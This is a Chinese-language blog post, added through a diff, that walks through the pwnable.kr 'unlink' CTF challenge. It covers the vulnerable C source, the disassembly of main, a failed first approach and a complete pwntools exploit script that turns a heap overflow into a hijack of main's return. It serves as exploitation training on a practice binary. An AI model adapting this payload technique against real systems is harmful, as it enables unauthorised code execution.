@@ -1,0 +1,207 @@
+---
+layout:     post
+title:      "pwnable.kr之unlink"
+subtitle:   " 堆还是栈？ "
+date:       2018-07-21 12:00:00
+author:     "Chris"
+catalog: true
+tags:
+    - Pwn
+ 
+---
+
+>题目地址：[http://pwnable.kr/play.php](http://pwnable.kr/play.php)
+
+>连接  ssh unlink@pwnable.kr -p2222 (pw: guest)
+
+## 0x01 程序分析
+
+它直接给出了源代码unlink.c
+
+	#include <stdio.h>
+	#include <stdlib.h>
+	#include <string.h>
+	typedef struct tagOBJ{
+	        struct tagOBJ* fd;
+	        struct tagOBJ* bk;
+	        char buf[8];
+	}OBJ;
+	
+	void shell(){
+	        system("/bin/sh");
+	}
+	
+	void unlink(OBJ* P){
+	        OBJ* BK;
+	        OBJ* FD;
+	        BK=P->bk;
+	        FD=P->fd;
+	        FD->bk=BK;
+	        BK->fd=FD;
+	}
+	int main(int argc, char* argv[]){
+	        malloc(1024);
+	        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
+	        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
+	        OBJ* C = (OBJ*)malloc(sizeof(OBJ));
+	
+	        // double linked list: A <-> B <-> C
+	        A->fd = B;
+	        B->bk = A;
+	        B->fd = C;
+	        C->bk = B;
+	
+	        printf("here is stack address leak: %p\n", &A);
+	        printf("here is heap address leak: %p\n", A);
+	        printf("now that you have leaks, get shell!\n");
+	        // heap overflow!
+	        gets(A->buf);
+	         
+	        // exploit this unlink!
+	        unlink(B);
+	        return 0;
+	}
+
+
+
+
+可以看出这段代码模仿了堆的一些实现,模拟的 Unlink 堆溢出漏洞。最后打印出A变量栈中地址和heap指向分配的mem地址,让你get shell.
+
+main函数汇编代码如下：
+
+	.text:0804852F ; int __cdecl main(int argc, const char **argv, const char **envp)
+	.text:0804852F                 public main
+	.text:0804852F main            proc near               ; DATA XREF: _start+17↑o
+	.text:0804852F
+	.text:0804852F var_14          = dword ptr -14h
+	.text:0804852F var_10          = dword ptr -10h
+	.text:0804852F var_C           = dword ptr -0Ch
+	.text:0804852F var_4           = dword ptr -4
+	.text:0804852F argc            = dword ptr  8
+	.text:0804852F argv            = dword ptr  0Ch
+	.text:0804852F envp            = dword ptr  10h
+	.text:0804852F
+	.text:0804852F ; __unwind {
+	.text:0804852F                 lea     ecx, [esp+4]
+	.text:08048533                 and     esp, 0FFFFFFF0h
+	.text:08048536                 push    dword ptr [ecx-4]
+	.text:08048539                 push    ebp
+	.text:0804853A                 mov     ebp, esp
+	.text:0804853C                 push    ecx
+	.text:0804853D                 sub     esp, 14h
+	.text:08048540                 sub     esp, 0Ch
+	.text:08048543                 push    400h            ; size
+	.text:08048548                 call    _malloc
+	.text:0804854D                 add     esp, 10h
+	.text:08048550                 sub     esp, 0Ch
+	.text:08048553                 push    10h             ; size
+	.text:08048555                 call    _malloc
+	.text:0804855A                 add     esp, 10h
+	.text:0804855D                 mov     [ebp+var_14], eax
+	.text:08048560                 sub     esp, 0Ch
+	.text:08048563                 push    10h             ; size
+	.text:08048565                 call    _malloc
+	.text:0804856A                 add     esp, 10h
+	.text:0804856D                 mov     [ebp+var_C], eax
+	.text:08048570                 sub     esp, 0Ch
+	.text:08048573                 push    10h             ; size
+	.text:08048575                 call    _malloc
+	.text:0804857A                 add     esp, 10h
+	.text:0804857D                 mov     [ebp+var_10], eax
+	.text:08048580                 mov     eax, [ebp+var_14]
+	.text:08048583                 mov     edx, [ebp+var_C]
+	.text:08048586                 mov     [eax], edx
+	.text:08048588                 mov     edx, [ebp+var_14]
+	.text:0804858B                 mov     eax, [ebp+var_C]
+	.text:0804858E                 mov     [eax+4], edx
+	.text:08048591                 mov     eax, [ebp+var_C]
+	.text:08048594                 mov     edx, [ebp+var_10]
+	.text:08048597                 mov     [eax], edx
+	.text:08048599                 mov     eax, [ebp+var_10]
+	.text:0804859C                 mov     edx, [ebp+var_C]
+	.text:0804859F                 mov     [eax+4], edx
+	.text:080485A2                 sub     esp, 8
+	.text:080485A5                 lea     eax, [ebp+var_14]
+	.text:080485A8                 push    eax
+	.text:080485A9                 push    offset format   ; "here is stack address leak: %p\n"
+	.text:080485AE                 call    _printf
+	.text:080485B3                 add     esp, 10h
+	.text:080485B6                 mov     eax, [ebp+var_14]
+	.text:080485B9                 sub     esp, 8
+	.text:080485BC                 push    eax
+	.text:080485BD                 push    offset aHereIsHeapAddr ; "here is heap address leak: %p\n"
+	.text:080485C2                 call    _printf
+	.text:080485C7                 add     esp, 10h
+	.text:080485CA                 sub     esp, 0Ch
+	.text:080485CD                 push    offset s        ; "now that you have leaks, get shell!"
+	.text:080485D2                 call    _puts
+	.text:080485D7                 add     esp, 10h
+	.text:080485DA                 mov     eax, [ebp+var_14]
+	.text:080485DD                 add     eax, 8
+	.text:080485E0                 sub     esp, 0Ch
+	.text:080485E3                 push    eax             ; s
+	.text:080485E4                 call    _gets
+	.text:080485E9                 add     esp, 10h
+	.text:080485EC                 sub     esp, 0Ch
+	.text:080485EF                 push    [ebp+var_C]
+	.text:080485F2                 call    unlink
+	.text:080485F7                 add     esp, 10h
+	.text:080485FA                 mov     eax, 0
+	.text:080485FF                 mov     ecx, [ebp-4]
+	.text:08048602                 leave
+	.text:08048603                 lea     esp, [ecx-4]
+	.text:08048606                 retn
+	.text:08048606 ; } // starts at 804852F
+	.text:08048606 main            endp
+
+## 0x01 漏洞分析之折腾
+
+明显程序在 gets(A->buf) 处有堆溢出，一开始我走偏了，狠狠折腾了一番。我的思路是他泄露了&A即栈地址，根据栈地址能算出ret时esp指向的栈顶地址，这个偏移是不会随着系统的aslr变化的。所以我找出了ret 时esp相对于&A的偏移 0x28 。知道了 ret 时的栈顶有什么用呢？ 只要用gets伪造好数据，调用unlink函数的时候就可以替换地址，我要做的就是将 B堆空间的fd替换成ret-4地址，bk替换成shell函数地址，payload如下：
+
+	payload="a"*8+p32(0)+p32(0x19)+p32(ret-4)+p32(shell_addr)
+
+这样unlink后
+
+	*(ret-4+4)=*(ret)=栈顶内容=shell_addr 
+	*(shell_addr)=ret-4
+
+这样当程序执行到main函数ret的时候，就能成功返回到我的shell地址，
+
+我本以为这样就能成功拿shell，结果我忽略了一个问题。那就是*(shell_addr)=ret-4 这个地方已经破坏了shell函数的代码段  /(ㄒoㄒ)/  失败告终。
+
+
+## 0x02 再次分析
+
+后来发现main函数结尾那里，
+
+	.text:080485FF                 mov     ecx, [ebp-4]
+	.text:08048602                 leave
+	.text:08048603                 lea     esp, [ecx-4]
+	.text:08048606                 retn
+
+会将**[ecx-4]**写入**esp**，只要我们可控制 **ecx**内容就能控制返回地址。再看上面有**mov  ecx,[ebp-4]** 这样一段代码，只有我们可以控制**[ebp-4]**的内容就能控制**ecx**内容。
+
+经调试发现**ebp-4=&A + 0x10** 代码有两次取地址内容，根据泄露的A的heap地址 ， heap地址下面（高处）即是getsO（）输入的内存空间，所以我们又构造 **heap+12=shell_addr+4**
+
+这样我们就将（shell的地址 + 4）写入（ebp-4的内存中）也就是将 A+12 的值写入 &A + 0x10的内存中，返回时便控制了eip。
+
+## 0x03 完整exp
+
+	from pwn import *
+	context(os='linux', log_level='debug')
+	p=process("./unlink")
+	shell_addr=0x80484eb
+	stack_addr=p.recvline()
+	stack_addr=stack_addr.split(": 0x")[1][:-1]
+	stack_addr=int(stack_addr,16)
+	
+	heap_addr=p.recvline()
+	heap_addr=heap_addr.split(": 0x")[1][:-1]
+	heap_addr=int(heap_addr,16)
+	
+	p.recvuntil("get shell!\n")
+	payload=p32(shell_addr)+"a"*12+p32(heap_addr+12)+p32(stack_addr+16)
+	p.sendline(payload)
+	p.interactive()
+
+>[文件下载](https://github.com/yxshyj/project/tree/master/pwn/pwnable.kr%E4%B9%8Bunlink)
